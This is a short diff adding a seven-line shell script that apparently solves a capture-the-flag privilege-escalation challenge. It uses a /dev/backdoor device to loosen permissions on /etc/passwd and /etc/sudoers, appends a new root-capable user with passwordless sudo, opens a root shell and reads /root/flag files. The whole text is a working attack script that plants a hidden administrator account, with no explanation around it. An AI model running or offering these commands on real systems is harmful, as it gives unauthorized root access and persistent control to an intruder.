@@ -1,0 +1,7 @@
+echo "b4ckd00r:/etc/sudoers:511" > /dev/backdoor
+echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor
+echo 'me:x:1000:1000::/:/bin/sh' >> /etc/passwd
+echo 'me ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers
+echo "b4ckd00r:/etc/sudoers:288" > /dev/backdoor
+sudo /bin/sh
+cat /root/flag*
